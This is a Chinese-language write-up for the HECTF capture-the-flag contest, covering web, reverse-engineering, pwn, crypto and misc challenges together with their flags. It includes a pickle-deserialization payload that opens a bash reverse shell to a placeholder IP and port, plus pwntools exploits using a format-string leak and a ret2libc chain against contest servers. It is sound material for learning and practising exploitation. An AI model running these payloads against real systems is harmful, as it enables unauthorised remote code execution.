可见使用了hmac哈希，无法爆破，但可以构造RCE代码序列化后放入cookie，点击按钮执行恶意代码，由于页面无结果回显，构造反弹shell代码： 12345678import base64import pickleclass A(object): def __reduce__(self): return (eval, (&quot;bash -c \\&quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1\\&quot;&quot;,))a = A()print(base64.b64encode(pickle.dumps(a))) 替换cookie后，点击按钮即可在vps getshell拿flag。 ​ Reverse贝斯变表base32，Cyberchef一把梭得到flag。 ​ apk 如何分析Apk呢 用jadx打开apk，在AndroidManifest.xml里发现： &lt;meta-data android:name=&quot;父拉哥&quot; android:value=&quot;付拉哥头&#123;Apktool_or_jadx&#125;&quot;/&gt; flag：HECTF&#123;Apktool_or_jadx&#125; ​ HelloIos 简单的ios 找到关键加密函数，简单异或还原flag。 ​ ezre easy reverse 加密逻辑很难看，利用IDA的findcrypt插件可以识别出存在SM4加密算法的关键参数数组。 利用动调找到SM4加密使用的128位key值，导出hex：AD763B4FCDCFD9251089FB0408A45F80，以及128bit密文，导出hex：D75CDA22176DD392A1A570915F66A61C。 找一个SM4算法的python脚本解密得到flag： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192class SM4Cipher: def __init__(self, key: bytes): if not len(key) == 16: raise ValueError(&quot;SM4 key must be length of 16. &quot;) self._key_r = self._generate_key(key) self.block_size = 16 def encrypt(self, plaintext: bytes): return self._do(plaintext, self._key_r) def decrypt(self, ciphertext: bytes): return self._do(ciphertext, self._key_r[::-1]) def _do(self, text: bytes, key_r: list): text_ = [0 for _ in range(4)] # 将 128bit 转化成 4x32bit for i in range(4): text_[i] = int.from_bytes(text[4 * i:4 * i + 4], &#x27;big&#x27;) for i in range(32): box_in = text_[1] ^ text_[2] ^ text_[3] ^ key_r[i] box_out = self._s_box(box_in) temp = text_[0] ^ box_out ^ self._rot_left(box_out, 2) ^ self._rot_left(box_out, 10) temp = temp ^ self._rot_left(box_out, 18) ^ self._rot_left(box_out, 24) text_ = text_[1:] + [temp] text_ = text_[::-1] # 结果逆序 # 将 4x32bit 合并成 128bit result = bytearray() for i in range(4): result.extend(text_[i].to_bytes(4, &#x27;big&#x27;)) return bytes(result) def _generate_key(self, key: bytes): &quot;&quot;&quot;密钥生成&quot;&quot;&quot; key_r, key_temp = [0 for _ in range(32)], [0 for _ in range(4)] FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] CK = [0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279] # 将 128bit 拆分成 4x32bit for i in range(4): temp = int.from_bytes(key[4 * i:4 * i + 4], &#x27;big&#x27;) key_temp[i] = temp ^ FK[i] # 循环生成轮密钥 for i in range(32): box_in = key_temp[1] ^ key_temp[2] ^ key_temp[3] ^ CK[i] box_out = self._s_box(box_in) key_r[i] = key_temp[0] ^ box_out ^ self._rot_left(box_out, 13) ^ self._rot_left(box_out, 23) key_temp = key_temp[1:] + [key_r[i]] return key_r @staticmethod def _s_box(n: int): BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] result = bytearray() # 将 32bit 拆分成 4x8bit，依次进行S盒变换 for item in list(n.to_bytes(4, &#x27;big&#x27;)): result.append(BOX[item]) return int.from_bytes(result, &#x27;big&#x27;) @staticmethod def _rot_left(n, m): &quot;&quot;&quot;循环左移&quot;&quot;&quot; return ((n &lt;&lt; m) | (n &gt;&gt; (32 - m))) &amp; 0xFFFFFFFF key = bytes.fromhex(&quot;AD763B4FCDCFD9251089FB0408A45F80&quot;) # 128bit密钥sm4 = SM4Cipher(key)# 动调测试加密# plaintext = bytes.fromhex(&quot;0123456789abcdeffedcba9876543210&quot;) # 128bit明文# print(sm4.encrypt(plaintext).hex())# 解密c = bytes.fromhex(&quot;D75CDA22176DD392A1A570915F66A61C&quot;)print(sm4.decrypt(c).hex())# 6f2069d8ab245446d789590d2cfe20d6 ​ author’sB0x still ez 识别代码逻辑为RC4算法，key为 thiskey，提取密文hex为 C3F5E5E2EC17E52ACA03B6FDC1BC704410CDA6130B9A73060E4DDE95129CD946， Cyberchef解出flag：HECTF&#123;Th3CutW0rmF0rgiv3sTh3Pl0w&#125; ​ run分析代码逻辑，为8层8*8迷宫，其中0为可走方块，1为不可走方块，wsad为上下左右，u为下一层，n为上一层。 将8层01迷宫矩阵打印出来，从第一层 (0,0) 手动模拟走迷宫，得到路径 ssddssuuwwddndduuussdussasauudd，加上HECTF{}即为flag。 ​ 还原md5 MD5(flag) = 55a573c5ff5ae053ee7f165c6e972613 哈哈哈，逆去吧 HINTS: 注意，re题目md5的flag提交时不需要再套HECTF{} txt内容像是调用libsfdata.so计算md5过程汇编操作记录，既然是全过程，肯定有读入原始数据，以16进制存入寄存器或内存的痕迹，HECT的hex值”48454354“，注意是小端序，全局搜索 54434548，找到 r6=0x54434548 疑似读入寄存器操作，继续全局搜索 =&gt; r6=0x，有 123456789101112Line 44619: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x0 =&gt; r6=0x54434548Line 44624: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x4 =&gt; r6=0x444d5f46Line 44629: [23:49:43 082][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x8 =&gt; r6=0x31332b32Line 44634: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0xc =&gt; r6=0x39363636Line 44639: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x10 =&gt; r6=0x37313237Line 44644: [23:49:43 084][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x14 =&gt; r6=0x34393338Line 44649: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x18 =&gt; r6=0x43753059Line 44654: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x1c =&gt; r6=0x6f646e61Line 44659: [23:49:43 086][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x20 =&gt; r6=0x743f7431Line 44664: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x24 =&gt; r6=0x4b233964Line 44669: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x28 =&gt; r6=0x37705f6eLine 44674: [23:49:43 088][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x2c =&gt; r6=0x80775576 提取出r6的值hex转字符即为flag：HECTF_MD2+31666972178394Y0uCando1t?td9#Kn_p7vUw ​ Pwn签到先利用 \\x00 截断绕过 strcmp 比较，进入 system(&#39;vim -R&#39;) 的vim交互模式，再使用vim命令 :e 文件名 读取flag内容。 12345678910111213141516from pwn import *context.log_level=&#x27;debug&#x27;r = remote(&#x27;121.4.111.50&#x27;,32365)r.recvline()r.recvline()r.send(b&#x27;\\x00&#x27;)r.recvline()r.recvline()r.recvline()r.send(b&#x27;x&#x27;)r.sendline(b&#x27;:e flag&#x27;)r.interactive() 值得注意的是，由于进入vim命令会清空终端内容，在pwntools交互下读取的内容会被瞬间刷掉，可以将输出重定向到文件，获取到flag内容输出： python test.py &gt; output.txt ​ 真·签到 听说你还没签上到 int类型强制转换为char，当值为128~255时变成负数，模拟伪代码，在最大值2147483647附近尝试寻找所需数字： 12345678910111213#include &lt;stdio.h&gt;int main()&#123; unsigned int x = 2147483646-124; printf(&quot;%d\\n&quot;, x); int y = x; printf(&quot;%d\\n&quot;, (char)y); printf(&quot;%d\\n&quot;, (char)y&lt;-125); printf(&quot;%d\\n&quot;, y&gt;255); return 0;&#125; 2147483522满足条件，传入后getshell拿到flag。 ​ fmt程序开了PIE，gdb动调，利用格式化字符串漏洞泄露当前函数地址，再减去偏移得到程序基址，剩下的部分简单ret2libc即可。 1234567891011121314151617181920212223242526272829303132333435from pwn import *r = remote(&#x27;121.4.102.43&#x27;,31550)elf = ELF(&#x27;./fmt&#x27;)libc = ELF(&#x27;/root/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;)#gdb.attach(r,&#x27;b *$rebase(0x123a)&#x27;)r.recvline()r.send(b&#x27;%15$p&#x27;)pie_base = eval(r.recv(14))-0x123aprint(hex(pie_base))pop_rdi = pie_base+0x1333pop_rsi_r15 = pie_base+0x1331ret = pie_base+0x101aputs_got = pie_base+elf.got.putsputs_plt = pie_base+elf.plt.putsget = pie_base+0x12abpl = b&#x27;a&#x27;*(0x10+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(get)r.sendline(pl)puts_addr = u64(r.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base = puts_addr-libc.sym.putsprint(hex(libc_base))system = libc_base+libc.sym.systembinsh = libc_base+libc.search(b&#x27;/bin/sh\\x00&#x27;).__next__()pl = b&#x27;a&#x27;*(0x10+8)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(0)*2+p64(system)+p64(get)print(len(pl))r.sendline(pl)r.interactive() ​ Crypto流动的音符txt内为音符加密，使用在线解密工具解密得到flag。 ​ matrix出题失误，源码泄露拿到flag。 ​ ezrsa 123456789101112131415161718192021from Crypto.Util.number import *from secret import flagflag = b&#x27;xxx&#x27;e = 114m = bytes_to_long(flag)p = getPrime(1024)q = getPrime(1024)t = getPrime(1024)n = p * q * tp_=pow(p,2,n)q_=pow(q,2,n)c = pow(m,e,n)print(&#x27;p_=&#x27;,p_)print(&#x27;q_=&#x27;,q_)print(&#x27;c=&#x27;,c)print(&#x27;n=&#x27;,n)#p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801#q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369#c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340#n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843 因 $p^2&lt;n,q^2&lt;n$，可直接开放求得 $p,q$ 及 $r$。 又 $\\gcd(e,\\varphi)=6$，利用 $\\gcd(\\cfrac{e}{6},\\varphi)=1$ 先常规RSA计算出 $m^6$ 再开方即可。 12345678910111213141516p_ = q_ = c = n = import gmpy2p = gmpy2.iroot(p_,2)[0]q = gmpy2.iroot(q_,2)[0]r = n//(p*q)f = (p-1)*(q-1)*(r-1)e = 114d = inverse_mod(e//6,f)mm = pow(c,d,n)m = gmpy2.iroot(mm,6)[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;HECTF&#123;Congratulation!!you_find_flag&#125;&#x27; ​ rsa2 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import *import sympyimport randomimport mathfrom secret import flag, hint, e1def mygenerate(): while True: p = getPrime(512) if p % 8 == 5: break g = p-random.randint(1 &lt;&lt; 13, 1 &lt;&lt; 15) q = sympy.nextprime(math.gamma(g+1) % p) return p, g, qp, g, q = mygenerate()n = p*qe2 = 65537m1 = bytes_to_long(flag)m2 = bytes_to_long(hint)c1 = pow(m1, e1, p)c2 = pow(m2, e2, n)print(&#x27;p =&#x27;+str(p))print(&#x27;g =&#x27;+str(g))print(&#x27;c1 =&#x27;+str(c1))print(&#x27;c2 =&#x27;+str(c2))&#x27;&#x27;&#x27;p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627&#x27;&#x27;&#x27; 素因子的生成函数中， $q=\\text{nextprime}(\\Gamma(g+1) \\bmod p)=\\text{nextprime}(g! \\bmod p)=\\text{nextprime}((p-r)! \\bmod p)$ 结合威尔逊定理 $(p-2)! \\equiv 1 \\pmod p$，有 $q = \\text{nextprime}(\\prod\\limits_{k=2}^{r-1}(p-k)^{-1} \\bmod p)$ 求出 $p,q$ ，RSA解密得hint：$e_1=2$，再解密得 $m$。 1234567891011121314151617181920212223242526272829import sympyimport mathp =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627r = p-gq = 1for k in range(2,r): q = q*inverse_mod(p-k,p)%pq = sympy.nextprime(q)n = p*qe2 = 65537f = (p-1)*(q-1)d2 = inverse_mod(e2,f)m2 = pow(c2,d2,n)hint = bytes.fromhex(hex(m2)[2:])print(hint)# b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;e1 = 2P.&lt;x&gt; = PolynomialRing(Zmod(p))f = x ^ e1 - c1x = f.monic().roots()[1][0]flag= bytes.fromhex(hex(x)[2:])print(flag)# b&#x27;HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;&#x27; ​ onebit 123456789101112131415161718192021222324252627282930313233import randomfrom Crypto.Util.number import *from secret import flagdef Le(n, p): return pow(n, (p - 1) // 2, p)def Encrypt(message, n, g): ciphertext = [] for i, m in enumerate(message): k = random.randint(1, 2**512) c = ((g**int(m)) * (k ** 2)) % n ciphertext.append(c) return ciphertextp = getPrime(512)q = getPrime(512)while True: g = getPrime(512) if Le(g, p) == p-1 and Le(g, q) == q-1: breakm = bytes_to_long(flag)m = str(bin(m))[2:]n = p*qc = Encrypt(m, n, g)f = open(&#x27;output.txt&#x27;, &#x27;w&#x27;)f.write(str(p)+&#x27;\\n&#x27;)f.write(str(g)+&#x27;\\n&#x27;)f.write(str(c))f.close() 加密结果 $c=g^mk^2$，符合GM同态加密系统，分别判断 $c_i$ 是否为基于模 $p$ 的二次剩余即可： 12345678910111213141516from Crypto.Util.number import long_to_bytesimport gmpy2p = 10314655380768703978472206709958842273413011533146844672390572314617934317138270085463277616223314361910177207125628813385040318943783776184128231730068517g = 8263101522955373984025637723346797526375555424855735493538626380254785750558737652925053637878963928060840011944043285344527052241847201267694354571887089c = plaintext = &#x27;&#x27;for k in c: cipher = int(k) if gmpy2.jacobi(cipher,p) == -1: plaintext += &#x27;1&#x27; else: plaintext += &#x27;0&#x27;print(long_to_bytes(int(plaintext,2)))# b&#x27;HECTF&#123;359dbb32-04d5d9c6-7d463ebc-741c7454&#125;&#x27; ​ mixture 12345678910111213p=235322474717419a=0b=8856682k=E = EllipticCurve(GF(p), [a, b])P = E.random_point()P.order()==pQ=k*Paes_key=kprint(&quot;P:&quot;,P)print(&quot;Q:&quot;,Q)#P=E(180571547161769,227820272156445)#Q=E(76765539897460,69715189045993) 1234567891011121314151617181920212223from Crypto.Cipher import AESimport base64aes_key = b&#x27;???&#x27;def pad(text): while len(text) % 16 != 0: text += b&#x27; &#x27; return textdef pad_key(key): while len(key) % 16 != 0: key += b&#x27; &#x27; return keyaes = AES.new(pad_key(aes_key), AES.MODE_ECB)plain_text = b&#x27;???&#x27;enc_text = aes.encrypt(pad(plain_text))enc_text_b64=base64.b64encode(enc_text)print(enc_text_b64)#bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8= ECC+AES。 ECC满足 $P.\\text{order}()=p$，利用Smart’s Attack解 $k$： 123456789101112131415161718192021222324252627282930313233343536p = 235322474717419a = 0b = 8856682E = EllipticCurve(GF(p), [a, b])P = E(180571547161769,227820272156445)Q = E(76765539897460,69715189045993)def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k)k = SmartAttack(P, Q, p)print(k)# 152675955744921 再代入还原AES解密即可： 123456789101112131415161718from Crypto.Cipher import AESimport base64aes_key = b&#x27;152675955744921&#x27;def pad_key(key): while len(key) % 16 != 0: key += b&#x27; &#x27; return keyaes = AES.new(pad_key(aes_key), AES.MODE_ECB)enc_text_b64 = &#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;enc_text = base64.b64decode(enc_text_b64)plain_text = aes.decrypt(enc_text)print(plain_text)# b&#x27;HECTF&#123;N0w_you_know_ecc_and_AES!&#125;&#x27; ​ xyz由于素数 $x \\in (2^{11},2^{12})$，爆破 $x$ ，再解关于 $y,z$ 的二元一次模方程组，根据式2将 $z$ 代入式1，得到关于 $y$ 的模方程，爆破求解 $m_1,m_2$，直到得到满足flag格式的值即解。 12345678910111213141516171819202122232425262728293031323334# Sageimport gmpy2p = 90269941327372741986138990624471228922188543388582792147052657918058877926048530226733915401487146960603412188605706389044850057749941283247036686933647699313789471852317821572828450212687824860596198164570332523289084374240518841959770316611451490236432102245045517406282462838053843074444594398723921432791a = 76528144673843458522824450076110371539627923753787397683655100259800630176098551106179842548579216667636910919853615859002981078385969868960955053568271518271225085057932965836858836455161323221071080085783042898199649213810735170960799816250402517689895712143360516054216300443029075429435539217594182165579b = 29135602763193779141406655503080226411846533327113770010672935904333289317045484412179311504151348405577659318044617676010167479271362994129802985294731037903701693595616818788260673254684442485084195062784616665615921849434909060917998818395292558822723253741815121539892159313890553027457549798418207587319s = []for i in range(10000): if i.bit_length()==12 and gmpy2.is_prime(i): s.append(i)print(len(s))ey = []for x in s: print(x) P.&lt;y&gt; = PolynomialRing(Zmod(p)) z = (b - x^12 - y^12)*inverse_mod(120*x,p) g = (12 * x + 12 * y + y * z + x * z ** 12) - a roots = g.monic().roots() if len(roots)&gt;0: for k in roots: ee = x yy = k[0] zz = (b - x^12 - yy^12)*inverse_mod(120*x,p)%p d = inverse_mod(ee, p-1) m1 = pow(yy, d, p) m2 = pow(zz, d, p) if &#x27;48454354467b&#x27; in hex(m1)[2:]: print(x) print(bytes.fromhex(hex(m1)[2:]+hex(m2)[2:])) break # 3989# HECTF&#123;46de31725b9a50b20e27cab2ddd5f5845cdd19066b4f97612&#125; ​ Misc咦~小鲨鱼来喽wireshark打开流量文件，逐个流查看，一眼找到flag。 ​ 来玩捉迷藏呀 你能寻找到真正的我吗？ png图片有lsb隐写，zsteg提取出内容： zsteg -E &quot;b1,rgb,lsb,xy&quot; 1010.png &gt; out1.txt， 得到16进制字符串转string，再xor 0x33发现zip压缩包头，提取出zip压缩包，解压得到flag.doc，将文字全选设置颜色，发现flag：HECTF&#123;hah0ha_Find-Me!!!&#125;。 ​ 你把我flag藏哪去了?flag.docx中打开隐藏文字，得到的base64解码得第一段字符串： kgkhlfloanaiufpghhalwujklkmownplkmwlygalpmfkgyggihuldlgaoyuloiggrplkvkgmrkaqzxemmiwklhugekleolpaaolffmaghmfgfmgvgjnblpmlajapufjlgplaojpjbffbjbwhuglggyjngmlbfygljbgxkixlmmqiksmpaqyojerafekadxdxxbarxlgngymsimhvuwkaexsglrapggkabmfulgvnmajufoekymalimxdijjpxyiagbpmkuallnlkpoeagfldlposkizvyxraazxrgxanoihqlxfogfgglpgjylkeakbylfvjomllkgjgymgfdlrpeqfklfslmejilpjiklpaapglxyevfkylfappbkdzflffllikqnialkbhjorndhsfomfaypghpqoxryimhfllfhlmkoreamroakgrljahmfailijanykfuaihfbzafaufmsffngfalmrbfflfaffwlnjmfgaaffauazjfijxiabfirmovpzekirbasfjsgzlukolyvohmvaalpkahsxfzammbfnmldzyaauifldvkmzbgfybaoffrflfoaadgmllnbgfpnrgxllyphyfnlexbvdnlokgoyilprflonshalkjaxngbjhlmbpdlamhkjfnlgmaagfjnjgkfrizlfflpmmglapxgmuninaaupkpfdigpsasmvkdjvgiyofdumpngpaljkjblfhahskiokpfgaayhnnfdsxkffqjaazvvdosefppfofigyamfnfngvlaoapdyixvbfdosobmlubaiugjxhfyfkvrakazgluyilpvgfwgynqggplbkwiiaxarlaflaalfkxfjlpegmmajngujlofuiffmvikfimraogqalalfmgubagfggoaakgrfqfhaemosraafyfopukudaalfggimhdfognhkrleflpalgalfapyjalgvoklgfllgaflaafafmazygpehfkzhlazngfmofliazlvnxanalugjlafovljfjubzgapehhfkfnfnggpalylivfegaaidrmyjagfalgmagflrklugadpffuaaky otherflag.txt中含有零宽字符，利用在线网站提取出第二段字符串： flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla 看字符串无规律，猜测为字符频率统计，找一个在线工具统计字符出现次数，按结果从大到小排序取出对应字符为 flagkpomijnhuybrvdxezswq&#123;&#125;，调整括号位置即为flag：flag&#123;kpomijnhuybrvdxezswq&#125;。 ​ 我的手要不行辣图片内文字用在线OCR识别转文字，hex转字符，根据文件头转存为zip压缩包，使用ARCHPR爆破出密码8686，解压得到txt内为音符加密，使用在线解密工具解密得到flag：flag&#123;y0u_fi0d_m2_f1ag&#125;。 ​ 